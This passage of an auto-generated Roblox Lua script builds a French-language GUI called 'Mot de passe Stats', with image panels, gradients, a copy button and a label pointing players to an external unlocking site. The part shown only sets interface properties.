-- Gui to Lua V5.1 (Shadow Edition)
-- GUI : Mot de passe Stats

local Players   = game:GetService('Players')
local player    = Players.LocalPlayer
local PlayerGui = player:WaitForChild('PlayerGui')

local _old = PlayerGui:FindFirstChild([[Mot de passe Stats]])
if _old then _old:Destroy() end

local _i = {}

-- Instances:

_i[1] = Instance.new("ScreenGui")
_i[1].DisplayOrder = 0
_i[1].Enabled = true
_i[1].IgnoreGuiInset = false
_i[1].ResetOnSpawn = true
_i[1].Name = [[Mot de passe Stats]]

_i[2] = Instance.new("Frame")
_i[2].AnchorPoint = Vector2.new(0.5,0.5)
_i[2].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[2].BackgroundTransparency = 1
_i[2].BorderColor3 = Color3.fromRGB(0,0,0)
_i[2].BorderSizePixel = 0
_i[2].ClipsDescendants = false
_i[2].LayoutOrder = 0
_i[2].Position = UDim2.new(0.5,0,0.5,0)
_i[2].Rotation = 0
_i[2].Selectable = false
_i[2].Size = UDim2.new(1,0,1,0)
_i[2].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[2].Visible = false
_i[2].ZIndex = 1
_i[2].Name = [[Canvas]]
_i[2].Parent = _i[1]

_i[3] = Instance.new("Frame")
_i[3].AnchorPoint = Vector2.new(0.5,0.5)
_i[3].BackgroundColor3 = Color3.fromRGB(255,0,4)
_i[3].BackgroundTransparency = 1
_i[3].BorderColor3 = Color3.fromRGB(0,0,0)
_i[3].BorderSizePixel = 0
_i[3].ClipsDescendants = false
_i[3].LayoutOrder = 0
_i[3].Position = UDim2.new(0.5,0,0.5,0)
_i[3].Rotation = 0
_i[3].Selectable = false
_i[3].Size = UDim2.new(0.601042,0,0.643188,0)
_i[3].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[3].Visible = true
_i[3].ZIndex = 1
_i[3].Name = [[Container]]
_i[3].Parent = _i[2]

_i[4] = Instance.new("UIAspectRatioConstraint")
_i[4].AspectRatio = 1.6628241539001465
_i[4].AspectType = Enum.AspectType.FitWithinMaxSize
_i[4].DominantAxis = Enum.DominantAxis.Width
_i[4].Name = [[UIAspectRatioConstraint]]
_i[4].Parent = _i[3]

_i[5] = Instance.new("Frame")
_i[5].AnchorPoint = Vector2.new(0.5,0.5)
_i[5].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[5].BackgroundTransparency = 1
_i[5].BorderColor3 = Color3.fromRGB(0,0,0)
_i[5].BorderSizePixel = 0
_i[5].ClipsDescendants = false
_i[5].LayoutOrder = 0
_i[5].Position = UDim2.new(0.5,0,0.521614,0)
_i[5].Rotation = 0
_i[5].Selectable = false
_i[5].Size = UDim2.new(0.959272,0,0.936599,0)
_i[5].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[5].Visible = true
_i[5].ZIndex = 1
_i[5].Name = [[Main]]
_i[5].Parent = _i[3]

_i[6] = Instance.new("UIAspectRatioConstraint")
_i[6].AspectRatio = 1.703076958656311
_i[6].AspectType = Enum.AspectType.FitWithinMaxSize
_i[6].DominantAxis = Enum.DominantAxis.Width
_i[6].Name = [[UIAspectRatioConstraint]]
_i[6].Parent = _i[5]

_i[7] = Instance.new("ImageLabel")
_i[7].AnchorPoint = Vector2.new(0.5,0.5)
_i[7].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[7].BackgroundTransparency = 1
_i[7].BorderColor3 = Color3.fromRGB(0,0,0)
_i[7].BorderSizePixel = 0
_i[7].ClipsDescendants = false
_i[7].LayoutOrder = 0
_i[7].Position = UDim2.new(0.5,0,0.5,0)
_i[7].Rotation = 0
_i[7].Selectable = false
_i[7].Size = UDim2.new(0.999097,0,0.993846,0)
_i[7].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[7].Visible = true
_i[7].ZIndex = 1
_i[7].Image = [[rbxassetid://16303547683]]
_i[7].ImageColor3 = Color3.fromRGB(140,140,140)
_i[7].ImageRectOffset = Vector2.new(0,0)
_i[7].ImageRectSize = Vector2.new(0,0)
_i[7].ImageTransparency = 0
_i[7].ResampleMode = Enum.ResamplerMode.Default
_i[7].ScaleType = Enum.ScaleType.Stretch
_i[7].SliceCenter = Rect.new(0,0,0,0)
_i[7].SliceScale = 1
_i[7].Name = [[Background]]
_i[7].Parent = _i[5]

_i[8] = Instance.new("UIGradient")
_i[8].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(46,46,46)),ColorSequenceKeypoint.new(1,Color3.fromRGB(29,29,29))})
_i[8].Enabled = true
_i[8].Offset = Vector2.new(0,0)
_i[8].Rotation = -90
_i[8].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[8].Name = [[UIGradient]]
_i[8].Parent = _i[7]

_i[9] = Instance.new("UIAspectRatioConstraint")
_i[9].AspectRatio = 1.7120742797851562
_i[9].AspectType = Enum.AspectType.FitWithinMaxSize
_i[9].DominantAxis = Enum.DominantAxis.Width
_i[9].Name = [[UIAspectRatioConstraint]]
_i[9].Parent = _i[7]

_i[10] = Instance.new("ImageLabel")
_i[10].AnchorPoint = Vector2.new(0.5,0.5)
_i[10].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[10].BackgroundTransparency = 1
_i[10].BorderColor3 = Color3.fromRGB(0,0,0)
_i[10].BorderSizePixel = 0
_i[10].ClipsDescendants = false
_i[10].LayoutOrder = 0
_i[10].Position = UDim2.new(0.48915,0,0.712074,0)
_i[10].Rotation = 0
_i[10].Selectable = false
_i[10].Size = UDim2.new(0.979204,0,0.574303,0)
_i[10].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[10].Visible = true
_i[10].ZIndex = 1
_i[10].Image = [[rbxassetid://16303570034]]
_i[10].ImageColor3 = Color3.fromRGB(11,11,11)
_i[10].ImageRectOffset = Vector2.new(0,0)
_i[10].ImageRectSize = Vector2.new(0,0)
_i[10].ImageTransparency = 0
_i[10].ResampleMode = Enum.ResamplerMode.Default
_i[10].ScaleType = Enum.ScaleType.Stretch
_i[10].SliceCenter = Rect.new(0,0,0,0)
_i[10].SliceScale = 1
_i[10].Name = [[Texture]]
_i[10].Parent = _i[7]

_i[11] = Instance.new("UIAspectRatioConstraint")
_i[11].AspectRatio = 2.919137477874756
_i[11].AspectType = Enum.AspectType.FitWithinMaxSize
_i[11].DominantAxis = Enum.DominantAxis.Width
_i[11].Name = [[UIAspectRatioConstraint]]
_i[11].Parent = _i[10]

_i[12] = Instance.new("ImageLabel")
_i[12].AnchorPoint = Vector2.new(0.5,0.5)
_i[12].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[12].BackgroundTransparency = 1
_i[12].BorderColor3 = Color3.fromRGB(0,0,0)
_i[12].BorderSizePixel = 0
_i[12].ClipsDescendants = false
_i[12].LayoutOrder = 0
_i[12].Position = UDim2.new(0.485533,0,0.99226,0)
_i[12].Rotation = 0
_i[12].Selectable = false
_i[12].Size = UDim2.new(0.971067,0,0.0325077,0)
_i[12].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[12].Visible = true
_i[12].ZIndex = 1
_i[12].Image = [[rbxassetid://16303582510]]
_i[12].ImageColor3 = Color3.fromRGB(5,113,255)
_i[12].ImageRectOffset = Vector2.new(0,0)
_i[12].ImageRectSize = Vector2.new(0,0)
_i[12].ImageTransparency = 0
_i[12].ResampleMode = Enum.ResamplerMode.Default
_i[12].ScaleType = Enum.ScaleType.Stretch
_i[12].SliceCenter = Rect.new(0,0,0,0)
_i[12].SliceScale = 1
_i[12].Name = [[Accent]]
_i[12].Parent = _i[7]

_i[13] = Instance.new("UIAspectRatioConstraint")
_i[13].AspectRatio = 51.14285659790039
_i[13].AspectType = Enum.AspectType.FitWithinMaxSize
_i[13].DominantAxis = Enum.DominantAxis.Width
_i[13].Name = [[UIAspectRatioConstraint]]
_i[13].Parent = _i[12]

_i[14] = Instance.new("UIGradient")
_i[14].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(0,0,0)),ColorSequenceKeypoint.new(0.510815,Color3.fromRGB(0,229,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(0,0,0))})
_i[14].Enabled = true
_i[14].Offset = Vector2.new(0,0)
_i[14].Rotation = 0
_i[14].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[14].Name = [[UIGradient]]
_i[14].Parent = _i[12]

_i[15] = Instance.new("TextButton")
_i[15].AnchorPoint = Vector2.new(0.5,0.5)
_i[15].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[15].BackgroundTransparency = 1
_i[15].BorderColor3 = Color3.fromRGB(0,0,0)
_i[15].BorderSizePixel = 0
_i[15].ClipsDescendants = false
_i[15].LayoutOrder = 0
_i[15].Position = UDim2.new(0.986159,0,0.0172212,0)
_i[15].Rotation = 0
_i[15].Selectable = true
_i[15].Size = UDim2.new(0.0747572,0,0.133846,0)
_i[15].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[15].Visible = true
_i[15].ZIndex = 1
_i[15].AutoButtonColor = true
_i[15].Font = Enum.Font.SourceSans
_i[15].LineHeight = 1
_i[15].Modal = false
_i[15].RichText = false
_i[15].Selected = false
_i[15].Text = [[]]
_i[15].TextColor3 = Color3.fromRGB(0,0,0)
_i[15].TextScaled = false
_i[15].TextSize = 14
_i[15].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[15].TextStrokeTransparency = 1
_i[15].TextTransparency = 0
_i[15].TextWrapped = false
_i[15].TextXAlignment = Enum.TextXAlignment.Center
_i[15].TextYAlignment = Enum.TextYAlignment.Center
_i[15].Name = [[X]]
_i[15].Parent = _i[5]

_i[16] = Instance.new("ImageLabel")
_i[16].AnchorPoint = Vector2.new(0,0)
_i[16].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[16].BackgroundTransparency = 1
_i[16].BorderColor3 = Color3.fromRGB(0,0,0)
_i[16].BorderSizePixel = 0
_i[16].ClipsDescendants = false
_i[16].LayoutOrder = 0
_i[16].Position = UDim2.new(-0.139535,0,-0.149177,0)
_i[16].Rotation = 0
_i[16].Selectable = false
_i[16].Size = UDim2.new(1.25581,0,1.2548,0)
_i[16].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[16].Visible = true
_i[16].ZIndex = 1
_i[16].Image = [[rbxassetid://126371125566945]]
_i[16].ImageColor3 = Color3.fromRGB(255,255,255)
_i[16].ImageRectOffset = Vector2.new(0,0)
_i[16].ImageRectSize = Vector2.new(0,0)
_i[16].ImageTransparency = 0
_i[16].ResampleMode = Enum.ResamplerMode.Default
_i[16].ScaleType = Enum.ScaleType.Stretch
_i[16].SliceCenter = Rect.new(0,0,0,0)
_i[16].SliceScale = 1
_i[16].Name = [[ImageLabel]]
_i[16].Parent = _i[15]

_i[17] = Instance.new("UIGradient")
_i[17].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(227,227,227)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[17].Enabled = true
_i[17].Offset = Vector2.new(0,0)
_i[17].Rotation = 0
_i[17].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[17].Name = [[UIGradient]]
_i[17].Parent = _i[16]

_i[18] = Instance.new("TextButton")
_i[18].AnchorPoint = Vector2.new(0.5,0.5)
_i[18].BackgroundColor3 = Color3.fromRGB(42,138,255)
_i[18].BackgroundTransparency = 1
_i[18].BorderColor3 = Color3.fromRGB(0,0,0)
_i[18].BorderSizePixel = 0
_i[18].ClipsDescendants = false
_i[18].LayoutOrder = 0
_i[18].Position = UDim2.new(0.500237,0,0.82079,0)
_i[18].Rotation = 0
_i[18].Selectable = true
_i[18].Size = UDim2.new(0.443771,0,0.195039,0)
_i[18].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[18].Visible = true
_i[18].ZIndex = 1
_i[18].AutoButtonColor = true
_i[18].Font = Enum.Font.SourceSans
_i[18].LineHeight = 1
_i[18].Modal = false
_i[18].RichText = false
_i[18].Selected = false
_i[18].Text = [[]]
_i[18].TextColor3 = Color3.fromRGB(0,0,0)
_i[18].TextScaled = false
_i[18].TextSize = 14
_i[18].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[18].TextStrokeTransparency = 1
_i[18].TextTransparency = 0
_i[18].TextWrapped = false
_i[18].TextXAlignment = Enum.TextXAlignment.Center
_i[18].TextYAlignment = Enum.TextYAlignment.Center
_i[18].Name = [[Bouton Copier]]
_i[18].Parent = _i[5]

_i[19] = Instance.new("TextLabel")
_i[19].AnchorPoint = Vector2.new(0,0)
_i[19].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[19].BackgroundTransparency = 1
_i[19].BorderColor3 = Color3.fromRGB(255,255,255)
_i[19].BorderSizePixel = 0
_i[19].ClipsDescendants = false
_i[19].LayoutOrder = 0
_i[19].Position = UDim2.new(0.215054,0,-4.23855e-07,0)
_i[19].Rotation = 0
_i[19].Selectable = false
_i[19].Size = UDim2.new(0.580645,0,0.984567,0)
_i[19].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[19].Visible = true
_i[19].ZIndex = 2
_i[19].Font = Enum.Font.SourceSans
_i[19].LineHeight = 1
_i[19].MaxVisibleGraphemes = -1
_i[19].RichText = false
_i[19].Text = [[COPYC]]
_i[19].TextColor3 = Color3.fromRGB(255,255,255)
_i[19].TextScaled = true
_i[19].TextSize = 100
_i[19].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[19].TextStrokeTransparency = 1
_i[19].TextTransparency = 0
_i[19].TextTruncate = Enum.TextTruncate.None
_i[19].TextWrapped = true
_i[19].TextXAlignment = Enum.TextXAlignment.Center
_i[19].TextYAlignment = Enum.TextYAlignment.Center
_i[19].Name = [[TextLabel]]
_i[19].Parent = _i[18]

_i[20] = Instance.new("UIStroke")
_i[20].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[20].Color = Color3.fromRGB(255,255,255)
_i[20].Enabled = true
_i[20].LineJoinMode = Enum.LineJoinMode.Round
_i[20].Thickness = 3.9000000953674316
_i[20].Transparency = 0
_i[20].Name = [[UIStroke]]
_i[20].Parent = _i[19]

_i[21] = Instance.new("UIGradient")
_i[21].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(0,195,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(0,110,255))})
_i[21].Enabled = true
_i[21].Offset = Vector2.new(0,0)
_i[21].Rotation = 0
_i[21].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[21].Name = [[UIGradient]]
_i[21].Parent = _i[20]

_i[22] = Instance.new("UIGradient")
_i[22].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(0,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[22].Enabled = true
_i[22].Offset = Vector2.new(0,0)
_i[22].Rotation = -90
_i[22].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[22].Name = [[UIGradient]]
_i[22].Parent = _i[19]

_i[23] = Instance.new("UIAspectRatioConstraint")
_i[23].AspectRatio = 3.875
_i[23].AspectType = Enum.AspectType.FitWithinMaxSize
_i[23].DominantAxis = Enum.DominantAxis.Width
_i[23].Name = [[UIAspectRatioConstraint]]
_i[23].Parent = _i[18]

_i[24] = Instance.new("ImageLabel")
_i[24].AnchorPoint = Vector2.new(0,0)
_i[24].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[24].BackgroundTransparency = 1
_i[24].BorderColor3 = Color3.fromRGB(0,0,0)
_i[24].BorderSizePixel = 0
_i[24].ClipsDescendants = false
_i[24].LayoutOrder = 0
_i[24].Position = UDim2.new(0,0,-0.875001,0)
_i[24].Rotation = 0
_i[24].Selectable = false
_i[24].Size = UDim2.new(1,0,2.53571,0)
_i[24].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[24].Visible = true
_i[24].ZIndex = 1
_i[24].Image = [[rbxassetid://79293578354348]]
_i[24].ImageColor3 = Color3.fromRGB(255,255,255)
_i[24].ImageRectOffset = Vector2.new(0,0)
_i[24].ImageRectSize = Vector2.new(0,0)
_i[24].ImageTransparency = 0
_i[24].ResampleMode = Enum.ResamplerMode.Default
_i[24].ScaleType = Enum.ScaleType.Stretch
_i[24].SliceCenter = Rect.new(0,0,0,0)
_i[24].SliceScale = 1
_i[24].Name = [[ImageLabel]]
_i[24].Parent = _i[18]

_i[25] = Instance.new("UIGradient")
_i[25].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(0,0,0)),ColorSequenceKeypoint.new(0.530782,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[25].Enabled = true
_i[25].Offset = Vector2.new(0,0)
_i[25].Rotation = -90
_i[25].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[25].Name = [[UIGradient]]
_i[25].Parent = _i[24]

_i[26] = Instance.new("ImageLabel")
_i[26].AnchorPoint = Vector2.new(0,0)
_i[26].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[26].BackgroundTransparency = 1
_i[26].BorderColor3 = Color3.fromRGB(0,0,0)
_i[26].BorderSizePixel = 0
_i[26].ClipsDescendants = false
_i[26].LayoutOrder = 0
_i[26].Position = UDim2.new(0.419913,0,0.235672,-7)
_i[26].Rotation = 0
_i[26].Selectable = false
_i[26].Size = UDim2.new(0.159058,0,0.270888,0)
_i[26].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[26].Visible = true
_i[26].ZIndex = 1
_i[26].Image = [[rbxassetid://123965417468651]]
_i[26].ImageColor3 = Color3.fromRGB(255,255,255)
_i[26].ImageRectOffset = Vector2.new(0,0)
_i[26].ImageRectSize = Vector2.new(0,0)
_i[26].ImageTransparency = 0
_i[26].ResampleMode = Enum.ResamplerMode.Default
_i[26].ScaleType = Enum.ScaleType.Stretch
_i[26].SliceCenter = Rect.new(0,0,0,0)
_i[26].SliceScale = 1
_i[26].Name = [[ImageLabel]]
_i[26].Parent = _i[5]

_i[27] = Instance.new("UIStroke")
_i[27].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[27].Color = Color3.fromRGB(0,0,0)
_i[27].Enabled = true
_i[27].LineJoinMode = Enum.LineJoinMode.Round
_i[27].Thickness = 5.599999904632568
_i[27].Transparency = 0.6000000238418579
_i[27].Name = [[UIStroke]]
_i[27].Parent = _i[26]

_i[28] = Instance.new("UICorner")
_i[28].CornerRadius = UDim.new(0,10000)
_i[28].BottomLeftRadius = UDim.new(0,10000)
_i[28].BottomRightRadius = UDim.new(0,10000)
_i[28].TopLeftRadius = UDim.new(0,10000)
_i[28].TopRightRadius = UDim.new(0,10000)
_i[28].Name = [[UICorner]]
_i[28].Parent = _i[26]

_i[29] = Instance.new("TextButton")
_i[29].AnchorPoint = Vector2.new(0.5,0.5)
_i[29].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[29].BackgroundTransparency = 1
_i[29].BorderColor3 = Color3.fromRGB(0,0,0)
_i[29].BorderSizePixel = 0
_i[29].ClipsDescendants = false
_i[29].LayoutOrder = 0
_i[29].Position = UDim2.new(0.386511,0,0.184572,0)
_i[29].Rotation = 0
_i[29].Selectable = true
_i[29].Size = UDim2.new(0.0445362,0,0.0704308,0)
_i[29].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[29].Visible = true
_i[29].ZIndex = 1
_i[29].AutoButtonColor = true
_i[29].Font = Enum.Font.SourceSans
_i[29].LineHeight = 1
_i[29].Modal = false
_i[29].RichText = false
_i[29].Selected = false
_i[29].Text = [[]]
_i[29].TextColor3 = Color3.fromRGB(0,0,0)
_i[29].TextScaled = false
_i[29].TextSize = 14
_i[29].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[29].TextStrokeTransparency = 1
_i[29].TextTransparency = 0
_i[29].TextWrapped = false
_i[29].TextXAlignment = Enum.TextXAlignment.Center
_i[29].TextYAlignment = Enum.TextYAlignment.Center
_i[29].Name = [[?]]
_i[29].Parent = _i[5]

_i[30] = Instance.new("ImageLabel")
_i[30].AnchorPoint = Vector2.new(0,0)
_i[30].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[30].BackgroundTransparency = 1
_i[30].BorderColor3 = Color3.fromRGB(0,0,0)
_i[30].BorderSizePixel = 0
_i[30].ClipsDescendants = false
_i[30].LayoutOrder = 0
_i[30].Position = UDim2.new(0,0,-0.0666667,0)
_i[30].Rotation = 0
_i[30].Selectable = false
_i[30].Size = UDim2.new(1,0,1.1,0)
_i[30].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[30].Visible = true
_i[30].ZIndex = 1
_i[30].Image = [[rbxassetid://131562149782285]]
_i[30].ImageColor3 = Color3.fromRGB(255,255,255)
_i[30].ImageRectOffset = Vector2.new(0,0)
_i[30].ImageRectSize = Vector2.new(0,0)
_i[30].ImageTransparency = 0
_i[30].ResampleMode = Enum.ResamplerMode.Default
_i[30].ScaleType = Enum.ScaleType.Crop
_i[30].SliceCenter = Rect.new(0,0,0,0)
_i[30].SliceScale = 1
_i[30].Name = [[ImageLabel]]
_i[30].Parent = _i[29]

_i[31] = Instance.new("UICorner")
_i[31].CornerRadius = UDim.new(0,20)
_i[31].BottomLeftRadius = UDim.new(0,20)
_i[31].BottomRightRadius = UDim.new(0,20)
_i[31].TopLeftRadius = UDim.new(0,20)
_i[31].TopRightRadius = UDim.new(0,20)
_i[31].Name = [[UICorner]]
_i[31].Parent = _i[30]

_i[32] = Instance.new("UIStroke")
_i[32].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[32].Color = Color3.fromRGB(255,255,255)
_i[32].Enabled = true
_i[32].LineJoinMode = Enum.LineJoinMode.Round
_i[32].Thickness = 1.7000000476837158
_i[32].Transparency = 0
_i[32].Name = [[UIStroke]]
_i[32].Parent = _i[30]

_i[33] = Instance.new("TextLabel")
_i[33].AnchorPoint = Vector2.new(0,0)
_i[33].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[33].BackgroundTransparency = 1
_i[33].BorderColor3 = Color3.fromRGB(0,0,0)
_i[33].BorderSizePixel = 0
_i[33].ClipsDescendants = false
_i[33].LayoutOrder = 0
_i[33].Position = UDim2.new(0.232224,0,0.501143,0)
_i[33].Rotation = 0
_i[33].Selectable = false
_i[33].Size = UDim2.new(0.574199,0,0.19233,0)
_i[33].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[33].Visible = true
_i[33].ZIndex = 1
_i[33].Font = Enum.Font.SourceSans
_i[33].LineHeight = 1
_i[33].MaxVisibleGraphemes = -1
_i[33].RichText = false
_i[33].Text = [[Veuillez cliquer sur ce bouton pour accéder au site qui va permettre faire le déverrouillage.]]
_i[33].TextColor3 = Color3.fromRGB(255,255,255)
_i[33].TextScaled = true
_i[33].TextSize = 14
_i[33].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[33].TextStrokeTransparency = 1
_i[33].TextTransparency = 0
_i[33].TextTruncate = Enum.TextTruncate.None
_i[33].TextWrapped = true
_i[33].TextXAlignment = Enum.TextXAlignment.Left
_i[33].TextYAlignment = Enum.TextYAlignment.Top
_i[33].Name = [[TextLabel]]
_i[33].Parent = _i[5]

_i[34] = Instance.new("UIStroke")
_i[34].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[34].Color = Color3.fromRGB(0,0,0)
_i[34].Enabled = true
_i[34].LineJoinMode = Enum.LineJoinMode.Round
_i[34].Thickness = 3.9000000953674316
_i[34].Transparency = 0
_i[34].Name = [[UIStroke]]
_i[34].Parent = _i[33]

_i[35] = Instance.new("TextButton")
_i[35].AnchorPoint = Vector2.new(0.5,0.5)
_i[35].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[35].BackgroundTransparency = 1
_i[35].BorderColor3 = Color3.fromRGB(0,0,0)
_i[35].BorderSizePixel = 0
_i[35].ClipsDescendants = false
_i[35].LayoutOrder = 0
_i[35].Position = UDim2.new(0.897086,0,0.0172212,0)
_i[35].Rotation = 0
_i[35].Selectable = true
_i[35].Size = UDim2.new(0.0747572,0,0.133846,0)
_i[35].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[35].Visible = true
_i[35].ZIndex = 1
_i[35].AutoButtonColor = true
_i[35].Font = Enum.Font.SourceSans
_i[35].LineHeight = 1
_i[35].Modal = false
_i[35].RichText = false
_i[35].Selected = false
_i[35].Text = [[]]
_i[35].TextColor3 = Color3.fromRGB(0,0,0)
_i[35].TextScaled = false
_i[35].TextSize = 14
_i[35].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[35].TextStrokeTransparency = 1
_i[35].TextTransparency = 0
_i[35].TextWrapped = false
_i[35].TextXAlignment = Enum.TextXAlignment.Center
_i[35].TextYAlignment = Enum.TextYAlignment.Center
_i[35].Name = [[-]]
_i[35].Parent = _i[5]

_i[36] = Instance.new("ImageLabel")
_i[36].AnchorPoint = Vector2.new(0,0)
_i[36].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[36].BackgroundTransparency = 1
_i[36].BorderColor3 = Color3.fromRGB(0,0,0)
_i[36].BorderSizePixel = 0
_i[36].ClipsDescendants = false
_i[36].LayoutOrder = 0
_i[36].Position = UDim2.new(-0.139535,0,-0.149177,0)
_i[36].Rotation = 0
_i[36].Selectable = false
_i[36].Size = UDim2.new(1.25581,0,1.2548,0)
_i[36].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[36].Visible = true
_i[36].ZIndex = 1
_i[36].Image = [[rbxassetid://101671699482021]]
_i[36].ImageColor3 = Color3.fromRGB(255,255,255)
_i[36].ImageRectOffset = Vector2.new(0,0)
_i[36].ImageRectSize = Vector2.new(0,0)
_i[36].ImageTransparency = 0
_i[36].ResampleMode = Enum.ResamplerMode.Default
_i[36].ScaleType = Enum.ScaleType.Stretch
_i[36].SliceCenter = Rect.new(0,0,0,0)
_i[36].SliceScale = 1
_i[36].Name = [[ImageLabel]]
_i[36].Parent = _i[35]

_i[37] = Instance.new("UIGradient")
_i[37].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(227,227,227)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[37].Enabled = true
_i[37].Offset = Vector2.new(0,0)
_i[37].Rotation = 0
_i[37].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[37].Name = [[UIGradient]]
_i[37].Parent = _i[36]

_i[38] = Instance.new("Frame")
_i[38].AnchorPoint = Vector2.new(0.5,0.5)
_i[38].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[38].BackgroundTransparency = 1
_i[38].BorderColor3 = Color3.fromRGB(0,0,0)
_i[38].BorderSizePixel = 0
_i[38].ClipsDescendants = false
_i[38].LayoutOrder = 0
_i[38].Position = UDim2.new(0.39688,0,0.0864553,0)
_i[38].Rotation = 0
_i[38].Selectable = false
_i[38].Size = UDim2.new(0.794627,0,0.172911,0)
_i[38].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[38].Visible = true
_i[38].ZIndex = 1
_i[38].Name = [[Title]]
_i[38].Parent = _i[3]

_i[39] = Instance.new("UIAspectRatioConstraint")
_i[39].AspectRatio = 7.641666889190674
_i[39].AspectType = Enum.AspectType.FitWithinMaxSize
_i[39].DominantAxis = Enum.DominantAxis.Width
_i[39].Name = [[UIAspectRatioConstraint]]
_i[39].Parent = _i[38]

_i[40] = Instance.new("ImageLabel")
_i[40].AnchorPoint = Vector2.new(0.5,0.5)
_i[40].BackgroundColor3 = Color3.fromRGB(0,0,0)
_i[40].BackgroundTransparency = 1
_i[40].BorderColor3 = Color3.fromRGB(0,0,0)
_i[40].BorderSizePixel = 0
_i[40].ClipsDescendants = false
_i[40].LayoutOrder = 0
_i[40].Position = UDim2.new(0.5,0,0.5,0)
_i[40].Rotation = 0
_i[40].Selectable = false
_i[40].Size = UDim2.new(1,0,1,0)
_i[40].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[40].Visible = true
_i[40].ZIndex = 1
_i[40].Image = [[rbxassetid://16303779706]]
_i[40].ImageColor3 = Color3.fromRGB(255,255,255)
_i[40].ImageRectOffset = Vector2.new(0,0)
_i[40].ImageRectSize = Vector2.new(0,0)
_i[40].ImageTransparency = 0
_i[40].ResampleMode = Enum.ResamplerMode.Default
_i[40].ScaleType = Enum.ScaleType.Stretch
_i[40].SliceCenter = Rect.new(0,0,0,0)
_i[40].SliceScale = 1
_i[40].Name = [[Main]]
_i[40].Parent = _i[38]

_i[41] = Instance.new("UIAspectRatioConstraint")
_i[41].AspectRatio = 7.641666889190674
_i[41].AspectType = Enum.AspectType.FitWithinMaxSize
_i[41].DominantAxis = Enum.DominantAxis.Width
_i[41].Name = [[UIAspectRatioConstraint]]
_i[41].Parent = _i[40]

_i[42] = Instance.new("ImageLabel")
_i[42].AnchorPoint = Vector2.new(0.5,0.5)
_i[42].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[42].BackgroundTransparency = 1
_i[42].BorderColor3 = Color3.fromRGB(0,0,0)
_i[42].BorderSizePixel = 0
_i[42].ClipsDescendants = false
_i[42].LayoutOrder = 0
_i[42].Position = UDim2.new(0.5,0,0.5,0)
_i[42].Rotation = 0
_i[42].Selectable = false
_i[42].Size = UDim2.new(0.969466,0,0.725,0)
_i[42].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[42].Visible = true
_i[42].ZIndex = 1
_i[42].Image = [[rbxassetid://16303784238]]
